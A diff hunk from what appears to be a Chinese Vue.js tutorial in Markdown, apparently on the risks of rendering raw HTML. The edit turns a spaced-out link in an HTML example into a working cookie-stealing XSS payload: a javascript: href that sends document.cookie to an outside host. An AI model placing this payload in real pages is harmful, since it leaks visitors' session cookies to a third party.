@@ -2232,7 +2232,7 @@ vm.$watch("isHot", function(){
 运行后页面输出：**`你好啊！`**
 
 ~~~html
-<a href=javascript:location.href= "http:/ /www. baidu . com?"+document.cookie></a>
+<a href=javascript:location.href= "http://www.baidu.com?"+document.cookie></a>
 ~~~
 
 - 总结
